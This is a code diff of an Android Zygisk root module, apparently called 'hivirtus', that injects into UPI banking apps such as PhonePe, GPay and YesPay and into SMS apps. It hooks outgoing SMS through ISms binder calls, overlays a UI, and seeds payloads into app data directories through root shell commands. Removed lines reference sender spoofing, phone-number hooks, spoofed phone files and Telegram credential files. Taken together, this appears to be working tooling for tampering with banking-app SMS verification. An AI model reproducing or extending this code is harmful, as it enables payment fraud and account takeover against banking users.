@@ -4,8 +4,6 @@
 #include "outgoing_sms_hook.hpp"
 #include "overlay_ui.hpp"
 #include "upi_registry.hpp"
-#include "sender_spoof.hpp"
-#include "phone_number_hook.hpp"
 
 #include <cstdint>
 #include <ctime>
@@ -22,23 +20,31 @@
 
 namespace {
 
-// v1.0.21:
-// - safe_inject logged in pre via companion (post companion = SELinux fail)
-// - SMS/phone/sender hooks installed NOW in post (deferred api hooks were no-ops)
-// - Overlay UI still deferred (no Zygisk Api needed)
+/**
+ * v1.0.39 — SMSTweaks-style crash-safe inject
+ *
+ * SMSTweaks (Xposed) hooks SmsManager/ISms AFTER app is up.
+ * Zygisk pe same idea:
+ *  - Messages: JNI BinderProxy ISms only (real SIM catch for SENDTO)
+ *  - Fragile UPI (YesPay/PhonePe/…): NO hooks in preSpecialize (crash fix)
+ *    → delayed JNI-only after app UI up
+ *  - NEVER PLT Binder/Intent/Activity on banking apps
+ *  - NEVER root_hide PLT (fopen/access) inside UPI — denylist Unmount Only
+ */
+
+bool is_messaging_pkg(const std::string& pkg) {
+    if (pkg.empty()) return false;
+    if (upi_registry::is_default_sms_app(pkg)) return true;
+    if (pkg.find("messaging") != std::string::npos) return true;
+    if (pkg.find(".mms") != std::string::npos) return true;
+    return false;
+}
 
 bool is_dangerous_process(const std::string& process) {
     if (process.empty()) return true;
-    // Default SMS apps are ALLOWED — SENDTO real-SIM path
-    if (process == "com.google.android.apps.messaging" ||
-        process == "com.samsung.android.messaging" ||
-        process == "com.android.messaging" ||
-        process == "com.google.android.apps.messaging.auto" ||
-        process == "com.motorola.messaging" ||
-        process == "com.oneplus.mms" ||
-        process == "com.coloros.mms") {
-        return false;
-    }
+    // Default SMS apps ALLOWED — SENDTO → real SIM path
+    if (is_messaging_pkg(process)) return false;
+
     static const char* kNever[] = {
         "zygote", "zygote64", "system_server",
         "com.android.phone",
@@ -51,8 +57,7 @@ bool is_dangerous_process(const std::string& process) {
         "com.android.networkstack.tethering",
         "com.android.se",
         "com.android.nfc",
-        "com.android.mms",
-        "com.android.mms.service",
+        "com.android.mms.service",  // telephony SMS service — never inject
         "com.samsung.android.settings",
         "com.samsung.android.app.telephonyui",
         "com.samsung.android.dialer",
@@ -75,6 +80,7 @@ bool is_dangerous_process(const std::string& process) {
     if (process.find("telephony") != std::string::npos) return true;
     if (process.find("simsettings") != std::string::npos) return true;
     if (upi_registry::is_launcher_package(process)) return true;
+    // Allow com.android.mms (stock Messages) via is_messaging above; block other com.android.*
     if (process.rfind("com.android.", 0) == 0) return true;
     if (process.rfind("android.", 0) == 0) return true;
     return false;
@@ -95,33 +101,21 @@ void append_diag(const char* path, const char* line) {
 }
 
 void report_line(zygisk::Api* api, const std::string& line) {
-    // Prefer root companion (reliable). Fallback: direct write.
     if (api) {
         const int fd = api->connectCompanion();
         if (fd >= 0) {
-            const uint32_t len = static_cast<uint32_t>(line.size());
-            if (write(fd, &len, sizeof(len)) == static_cast<ssize_t>(sizeof(len)) &&
-                (len == 0 || write(fd, line.data(), len) == static_cast<ssize_t>(len))) {
-                close(fd);
-                return;
-            }
+            const uint32_t n = static_cast<uint32_t>(line.size());
+            write(fd, &n, sizeof(n));
+            if (n) write(fd, line.data(), n);
             close(fd);
+            return;
         }
     }
     append_diag("/data/local/tmp/hivirtus_inject.log", line.c_str());
 }
 
-void mark_active() {
-    FILE* f = fopen("/data/local/tmp/hivirtus_zygisk_native.active", "w");
-    if (f) {
-        fprintf(f, "1\n");
-        fclose(f);
-        chmod("/data/local/tmp/hivirtus_zygisk_native.active", 0644);
-    }
-}
-
 bool native_overlay_wanted() {
-    return access("/data/local/tmp/hivirtus_disable_native_overlay", R_OK) != 0;
+    return access("/data/local/tmp/hivirtus_disable_overlay.flag", F_OK) != 0;
 }
 
 bool is_yespay(const std::string& pkg) {
@@ -132,7 +126,7 @@ struct DeferredOverlayJob {
     JavaVM* vm = nullptr;
     zygisk::Api* api = nullptr;
     std::string pkg;
-    int delay_sec = 3;
+    int delay_sec = 5;
 };
 
 void* deferred_overlay_worker(void* arg) {
@@ -141,8 +135,9 @@ void* deferred_overlay_worker(void* arg) {
     if (job->vm && job->api && native_overlay_wanted()) {
         JNIEnv* env = nullptr;
         if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
+            // Java UiHelper only — no Activity PLT
             overlay_ui::install(env, job->api, job->pkg);
-            append_diag("/data/local/tmp/hivirtus_overlay.debug", "overlay_ok");
+            append_diag("/data/local/tmp/hivirtus_overlay.debug", "overlay_ok_java");
             job->vm->DetachCurrentThread();
         }
     }
@@ -164,20 +159,24 @@ void schedule_overlay_ui(JNIEnv* env, zygisk::Api* api, const std::string& pkg, 
     pthread_detach(t);
 }
 
-struct DeferredSenderJob {
+struct DeferredHookJob {
     JavaVM* vm = nullptr;
     zygisk::Api* api = nullptr;
     std::string pkg;
-    int delay_sec = 5;
+    int delay_sec = 6;
 };
 
-void* deferred_sender_worker(void* arg) {
-    auto* job = static_cast<DeferredSenderJob*>(arg);
+void* deferred_hook_worker(void* arg) {
+    auto* job = static_cast<DeferredHookJob*>(arg);
     if (job->delay_sec > 0) sleep(static_cast<unsigned>(job->delay_sec));
     if (job->vm && job->api) {
         JNIEnv* env = nullptr;
         if (job->vm->AttachCurrentThread(&env, nullptr) == JNI_OK && env) {
-            sender_spoof::install(env, job->api, job->pkg.c_str());
+            // SMSTweaks-style: hooks AFTER app settled — JNI only, no PLT
+            std::string st =
+                outgoing_sms_hook::install_for_upi(env, job->api, job->pkg.c_str());
+            append_diag("/data/local/tmp/hivirtus_inject.log",
+                        ("HOOK_DEFERRED|" + st).c_str());
             job->vm->DetachCurrentThread();
         }
     }
@@ -185,17 +184,18 @@ void* deferred_sender_worker(void* arg) {
     return nullptr;
 }
 
-void schedule_sender(JNIEnv* env, zygisk::Api* api, const std::string& pkg, int delay_sec) {
-    if (!env || !api) return;
+void schedule_deferred_sms_hooks(JNIEnv* env, zygisk::Api* api, const std::string& pkg,
+                                 int delay_sec) {
+    if (!env || !api || pkg.empty()) return;
     JavaVM* vm = nullptr;
     if (env->GetJavaVM(&vm) != JNI_OK || !vm) return;
-    auto* job = new DeferredSenderJob();
+    auto* job = new DeferredHookJob();
     job->vm = vm;
     job->api = api;
     job->pkg = pkg;
     job->delay_sec = delay_sec;
     pthread_t t{};
-    pthread_create(&t, nullptr, deferred_sender_worker, job);
+    pthread_create(&t, nullptr, deferred_hook_worker, job);
     pthread_detach(t);
 }
 
@@ -230,35 +230,37 @@ public:
         report_line(api_, "pre_seen:" + process_name_);
         report_line(api_, "safe_inject:" + pkg_);
 
-        std::string data_dir;
         if (args->app_data_dir) {
             const char* dd = env_->GetStringUTFChars(args->app_data_dir, nullptr);
             if (dd) {
-                data_dir = dd;
+                data_dir_ = dd;
                 env_->ReleaseStringUTFChars(args->app_data_dir, dd);
             }
         }
-        data_dir_ = data_dir;
-        const int uid = args->uid;
-        if (!data_dir.empty()) {
-            report_line(api_, "prep_assets|" + pkg_ + "|" + std::to_string(uid) + "|" + data_dir);
+        if (!data_dir_.empty()) {
+            report_line(api_, "prep_assets|" + pkg_ + "|" + std::to_string(args->uid) + "|" +
+                                  data_dir_);
         }
 
-        // CRITICAL: install hooks in PRE while Zygisk Api is guaranteed valid.
-        // postSpecialize pe user ke logs me sirf companion_seed tha — hooks miss.
         ConfigManager::instance().reload();
         ConfigManager::instance().apply_ui_save_file();
         ConfigManager::instance().reload();
 
-        std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
-        report_line(api_, std::string("HOOK|") + sms_st);
+        is_msg_ = is_messaging_pkg(pkg_);
+        fragile_ = !is_msg_ && upi_registry::is_fragile_banking_app(pkg_);
 
-        // SAFE MODE: no phone/sender JNI hooks — telephony spoof crashes UPI on open (A11-16)
-        const bool is_msg = (pkg_.find("messaging") != std::string::npos) ||
-                            (pkg_.find(".mms") != std::string::npos) ||
-                            (pkg_ == "com.android.mms") || (pkg_ == "com.oneplus.mms") ||
-                            (pkg_ == "com.coloros.mms") || (pkg_ == "com.samsung.android.messaging");
-        report_line(api_, is_msg ? ("safe_msg:" + pkg_) : ("safe_upi:" + pkg_));
+        if (is_msg_) {
+            // Messages: install ISms NOW (SENDTO real-SIM catch) — JNI only
+            std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
+            report_line(api_, std::string("HOOK_MSG|") + sms_st);
+        } else if (fragile_) {
+            // YesPay/PhonePe/GPay/Hero: ZERO hooks in pre — prevents open crash
+            report_line(api_, "fragile_no_pre_hooks:" + pkg_);
+        } else {
+            // Mild UPI: JNI hooks in pre OK
+            std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
+            report_line(api_, std::string("HOOK_UPI|") + sms_st);
+        }
 
         keep_ = true;
     }
@@ -274,15 +276,6 @@ public:
             return;
         }
 
-        // Soft re-assert SMS hooks only (no phone/sender — crash-safe)
-        outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
-        outgoing_sms_hook::install_binder_plt_force(api_);
-
-        const bool is_msg = (pkg_.find("messaging") != std::string::npos) ||
-                            (pkg_.find(".mms") != std::string::npos) ||
-                            (pkg_ == "com.android.mms") || (pkg_ == "com.oneplus.mms") ||
-                            (pkg_ == "com.coloros.mms") || (pkg_ == "com.samsung.android.messaging");
-
         mark_active();
         {
             std::string base = data_dir_.empty()
@@ -295,18 +288,30 @@ public:
             mkdir(base.c_str(), 0700);
             FILE* sf = fopen((base + "/post_hooks.txt").c_str(), "w");
             if (sf) {
-                fprintf(sf, "post_ok_safe:%s\n", pkg_.c_str());
+                fprintf(sf, "post_v139:%s msg=%d fragile=%d\n", pkg_.c_str(), is_msg_ ? 1 : 0,
+                        fragile_ ? 1 : 0);
                 fclose(sf);
             }
         }
 
-        // Overlay: delay longer on fragile apps; skip Messages
-        if (native_overlay_wanted() && !is_msg) {
-            const bool fragile = upi_registry::is_fragile_banking_app(pkg_);
-            const bool yespay = is_yespay(pkg_);
-            // Longer delay = fewer startup races/crashes
-            const int ov = yespay ? 4 : (fragile ? 3 : 2);
-            schedule_overlay_ui(env_, api_, pkg_, ov);
+        if (is_msg_) {
+            // Re-assert Messages hooks (JNI only — install_for_upi skips PLT)
+            outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
+            report_line(api_, "post_msg_ok:" + pkg_);
+        } else if (fragile_) {
+            // SMSTweaks-style: wait for UI, then JNI BinderProxy/Intent
+            const int delay = is_yespay(pkg_) ? 8 : 6;
+            schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
+            report_line(api_, "post_fragile_deferred:" + pkg_ + "|d=" + std::to_string(delay));
+            // Bubble after hooks settle
+            if (native_overlay_wanted()) {
+                schedule_overlay_ui(env_, api_, pkg_, delay + 2);
+            }
+        } else {
+            outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
+            if (native_overlay_wanted()) {
+                schedule_overlay_ui(env_, api_, pkg_, 3);
+            }
         }
 
         touch_heartbeat();
@@ -319,11 +324,20 @@ public:
 
 private:
     void touch_heartbeat() {
-        FILE* f = fopen("/data/local/tmp/hivirtus_module_heartbeat.txt", "w");
+        FILE* f = fopen("/data/local/tmp/hivirtus_zygisk_native.active", "w");
         if (f) {
             fprintf(f, "%ld\n", static_cast<long>(time(nullptr)));
             fclose(f);
-            chmod("/data/local/tmp/hivirtus_module_heartbeat.txt", 0644);
+            chmod("/data/local/tmp/hivirtus_zygisk_native.active", 0666);
+        }
+    }
+
+    void mark_active() {
+        FILE* f = fopen("/data/local/tmp/hivirtus_active_hook_pkg.txt", "w");
+        if (f) {
+            fprintf(f, "%s\n", pkg_.c_str());
+            fclose(f);
+            chmod("/data/local/tmp/hivirtus_active_hook_pkg.txt", 0666);
         }
     }
 
@@ -333,6 +347,8 @@ private:
     std::string pkg_;
     std::string data_dir_;
     bool keep_ = false;
+    bool is_msg_ = false;
+    bool fragile_ = false;
 };
 
 void companion_prep_assets(const std::string& pkg, int uid, const std::string& data_dir) {
@@ -344,7 +360,6 @@ void companion_prep_assets(const std::string& pkg, int uid, const std::string& d
         "mkdir -p '" + dest + "/ui' '" + files + "' 2>/dev/null; "
         "cp -f '" + std::string(mod) + "/bridge.dex' '" + dest + "/bridge.dex' 2>/dev/null; "
         "cp -f '" + std::string(mod) + "/ui/'* '" + dest + "/ui/' 2>/dev/null; "
-        // GLOBAL config → every app (ek Save sab jagah)
         "for src in /data/local/tmp/hivirtus_ui_save.json " + std::string(mod) + "/ui_save.json; do "
         "  [ -s \"$src\" ] || continue; "
         "  cp -f \"$src\" '" + dest + "/ui_save.json'; "
@@ -380,32 +395,13 @@ void companion_prep_assets(const std::string& pkg, int uid, const std::string& d
         "echo \"$(date +%s) companion_seed:" + pkg + "\" >> '" + dest + "/hook_status.txt'; "
         "echo \"$(date +%s) companion_seed:" + pkg +
         "\" >> /data/local/tmp/hivirtus_hook_status.txt; "
-        "echo \"$(date +%s) companion_seed:" + pkg + "\" >> " + std::string(mod) +
-        "/hook_status.txt; "
         "chmod -R 755 '" + dest + "' 2>/dev/null; "
         "chmod 644 '" + dest + "/bridge.dex' '" + dest + "/ui/'* 2>/dev/null; "
-        "chmod 666 '" + dest + "/hook_status.txt' '" + dest + "/post_hooks.txt' "
-        "'" + dest + "/ui_save.json' '" + dest + "/config.json' "
-        "'" + dest + "/hivirtus_telegram_credentials.json' '" + dest +
-        "/hivirtus_sender_id.txt' "
-        "'" + files + "/hivirtus_ui_save.json' '" + files +
-        "/hivirtus_telegram_credentials.json' "
-        "'" + files + "/hivirtus_sender_id.txt' '" + files +
-        "/hivirtus_spoof_phone.txt' "
-        "/data/local/tmp/hivirtus_hook_status.txt 2>/dev/null; "
-        "chown -R " + std::to_string(uid) + ":" + std::to_string(uid) + " '" + dest + "' '" +
-        files + "/hivirtus_ui_save.json' '" + files +
-        "/hivirtus_telegram_credentials.json' '" + files + "/hivirtus_sender_id.txt' '" + files +
-        "/hivirtus_spoof_phone.txt' 2>/dev/null; "
+        "chmod 666 '" + dest + "/hook_status.txt' '" + dest +
+        "/post_hooks.txt' '" + dest + "/ui_save.json' 2>/dev/null; "
+        "chown -R " + std::to_string(uid) + ":" + std::to_string(uid) + " '" + dest + "' 2>/dev/null; "
         "restorecon -R '" + dest + "' 2>/dev/null; true";
     system(cmd.c_str());
-
-    FILE* f = fopen("/data/local/tmp/hivirtus_overlay.debug", "a");
-    if (f) {
-        fprintf(f, "prep_assets_ok:%s uid=%d dir=%s\n", pkg.c_str(), uid, dest.c_str());
-        fclose(f);
-        chmod("/data/local/tmp/hivirtus_overlay.debug", 0666);
-    }
 }
 
 void companion_handler(int client) {
@@ -427,21 +423,17 @@ void companion_handler(int client) {
         }
     }
 
-    // Root-visible hook status (A16 app can't write tmp)
-    if (line.rfind("HOOK|", 0) == 0 || line.rfind("phone_hook:", 0) == 0 ||
-        line.rfind("sender_hook:", 0) == 0 || line.rfind("upi_hook_done", 0) == 0) {
+    if (line.rfind("HOOK", 0) == 0 || line.find("upi_hook_done") != std::string::npos ||
+        line.rfind("fragile_", 0) == 0 || line.rfind("post_", 0) == 0) {
         char tsline[512];
         snprintf(tsline, sizeof(tsline), "%ld %s\n", static_cast<long>(time(nullptr)),
                  line.c_str());
-        auto append_root = [&](const char* path) {
-            FILE* hf = fopen(path, "a");
-            if (!hf) return;
+        FILE* hf = fopen("/data/local/tmp/hivirtus_hook_status.txt", "a");
+        if (hf) {
             fputs(tsline, hf);
             fclose(hf);
-            chmod(path, 0666);
-        };
-        append_root("/data/local/tmp/hivirtus_hook_status.txt");
-        append_root("/data/adb/modules/hivirtus_zygisk_mode/hook_status.txt");
+            chmod("/data/local/tmp/hivirtus_hook_status.txt", 0666);
+        }
         FILE* latest = fopen("/data/local/tmp/hivirtus_hook_status_latest.txt", "w");
         if (latest) {
             fputs(tsline, latest);
@@ -455,11 +447,6 @@ void companion_handler(int client) {
         fprintf(f, "%s\n", line.c_str());
         fclose(f);
         chmod("/data/local/tmp/hivirtus_inject.log", 0666);
-    }
-    f = fopen("/data/adb/modules/hivirtus_zygisk_mode/inject_mirror.log", "a");
-    if (f) {
-        fprintf(f, "%s\n", line.c_str());
-        fclose(f);
     }
 }
 
